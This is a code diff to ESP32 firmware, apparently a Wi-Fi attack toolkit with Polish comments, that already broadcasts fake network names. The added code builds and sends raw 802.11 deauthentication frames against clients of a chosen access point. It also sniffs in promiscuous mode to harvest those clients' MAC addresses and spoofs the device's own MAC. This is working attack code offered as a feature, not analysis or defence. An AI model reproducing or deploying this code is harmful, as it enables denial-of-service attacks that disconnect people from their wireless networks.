@@ -5,6 +5,20 @@
 #include "WiFi.h"
 #include "networkKit.h"         
 
+// Maksymalna liczba klientów, których można śledzić
+const int MAX_CLIENTS = 10;
+uint8_t target_mac[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
+
+// Tablica do przechowywania adresów MAC klientów
+uint8_t clients[MAX_CLIENTS][6];
+int client_count = 0;
+
+// Liczba pakietów deauth do wysłania
+const int packet_count = 100;
+
+// Flaga dla nowo wykrytych klientów
+bool new_clients_detected = false;
+
 extern "C" {
 #include "esp_wifi.h"
   esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
@@ -162,4 +176,152 @@ void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
       packetCounter = 0;
     }
   }
+}
+
+// Funkcja wysyłająca pakiety deauth do danego klienta
+void send_deauth_packets(String &client_mac_str, int count) {
+  uint8_t client_mac[6];
+  
+  // Konwersja adresu MAC z string na tablicę bajtów
+  if (!convert_mac_string_to_bytes(client_mac_str, client_mac)) {
+    Serial.println("Błędny format adresu MAC klienta.");
+    return;
+  }
+
+  uint8_t deauth_packet[26] = {
+    0xC0, 0x00,   // Typ i podtyp ramki: deauth
+    0x3A, 0x01,   // Czas trwania
+    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // MAC odbiorcy
+    client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],  // MAC nadawcy
+    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // BSSID
+    0x00, 0x00,   // Numer sekwencji
+    0x01, 0x00    // Powód deautoryzacji
+  };
+
+  esp_err_t result = wifi_send_pkt_freedom(deauth_packet, sizeof(deauth_packet), false);
+  if (result == ESP_OK) {
+    Serial.println("Packet sent successfully.");
+  } else {
+    Serial.println("Error sending packet.");
+  }
+}
+
+void deauth_promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
+  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+  uint8_t *hdr = pkt->payload;
+
+  // MAC adresy w pakiecie 802.11 są w offsetach:
+  // addr1: odbiorca, addr2: nadawca, addr3: BSSID
+  uint8_t *addr1 = hdr + 4;   // Odbiorca
+  uint8_t *addr2 = hdr + 10;  // Nadawca
+  uint8_t *addr3 = hdr + 16;  // BSSID
+
+  // Sprawdź, czy pakiet jest od/do określonego AP (target_mac)
+  if (memcmp(addr1, target_mac, 6) == 0 || memcmp(addr2, target_mac, 6) == 0) {
+    //Serial.println("Detected " + String(addr2));
+    // Jeśli klient jest nowy, dodaj go do listy
+    if (!is_client_known(addr2)) {
+      add_client(addr2);
+    }
+  }
+}
+
+bool is_client_known(uint8_t *mac) {
+  for (int i = 0; i < client_count; i++) {
+    if (memcmp(clients[i], mac, 6) == 0) {
+      return true;
+    }
+  }
+  return false;
+}
+
+void initClientSniffing() {
+  WiFi.mode(WIFI_STA);  // Ustawienie trybu WiFi na stację
+  esp_wifi_set_promiscuous(true);  // Włączenie trybu promiskuitywnego
+  esp_wifi_set_promiscuous_rx_cb(deauth_promiscuous_rx_cb);  // Ustawienie callback dla trybu promiskuitywnego
+  Serial.println("Sniffing for clients...");
+}
+
+void get_clients_list(String client_list[], int &count) {
+  count = client_count;  // Przypisz aktualną liczbę klientów
+  for (int i = 0; i < client_count; i++) {
+    String mac = "";
+    for (int j = 0; j < 6; j++) {
+      mac += String(clients[i][j], HEX);
+      if (j < 5) {
+        mac += ":";
+      }
+    }
+    client_list[i] = mac;
+  }
+}
+
+void add_client(uint8_t *mac) {
+  if (client_count < MAX_CLIENTS) {
+    memcpy(clients[client_count], mac, 6);
+    client_count++;
+    new_clients_detected = true;
+    Serial.print("Dodano nowego klienta: ");
+    for (int i = 0; i < 6; i++) {
+      Serial.printf("%02X", mac[i]);
+      if (i < 5) Serial.print(":");
+    }
+    Serial.println();
+  } else {
+    Serial.println("Max client lenght is abused.");
+  }
+}
+
+void setMac(uint8_t new_mac[6]) {
+  memcpy(target_mac, new_mac, 6);  // Kopiowanie nowego adresu MAC do target_mac
+
+  Serial.print("Target MAC ustawiony na: ");
+  for (int i = 0; i < 6; i++) {
+    Serial.printf("%02X", target_mac[i]);
+    if (i < 5) Serial.print(":");
+  }
+  Serial.println();
+}
+
+bool set_mac_address(uint8_t new_mac[6]) {
+  esp_err_t result = esp_wifi_set_mac(WIFI_IF_STA, new_mac);  // Ustawienie MAC dla interfejsu stacji (WIFI_STA)
+
+  if (result == ESP_OK) {
+    Serial.print("Adres MAC ustawiony na: ");
+    for (int i = 0; i < 6; i++) {
+      Serial.printf("%02X", new_mac[i]);
+      if (i < 5) Serial.print(":");
+    }
+    Serial.println();
+    return true;  // Sukces
+  } else {
+    Serial.println("Błąd podczas ustawiania adresu MAC!");
+    return false;  // Błąd
+  }
+}
+
+bool convert_mac_string_to_bytes(const String &mac_str, uint8_t *mac_bytes) {
+  if (mac_str.length() != 17) return false;  // Adres MAC ma mieć 17 znaków (XX:XX:XX:XX:XX:XX)
+  
+  int values[6];  // Tymczasowa tablica na wartości
+  if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x", 
+             &values[0], &values[1], &values[2], 
+             &values[3], &values[4], &values[5]) == 6) {
+    // Konwersja wartości na bajty
+    for (int i = 0; i < 6; ++i) {
+      mac_bytes[i] = (uint8_t)values[i];
+    }
+    return true;
+  } else {
+    return false;  // Niepoprawny format adresu MAC
+  }
+}
+
+void clearClients() {
+  // Przejdź przez każdy klienta w tablicy i wyzeruj jego MAC
+  for (int i = 0; i < MAX_CLIENTS; i++) {
+    memset(clients[i], 0, 6);  // Ustaw wszystkie bajty MAC na 0
+  }
+  client_count = 0;  // Zresetuj licznik klientów
+  Serial.println("Tablica klientów została wyczyszczona.");
 }
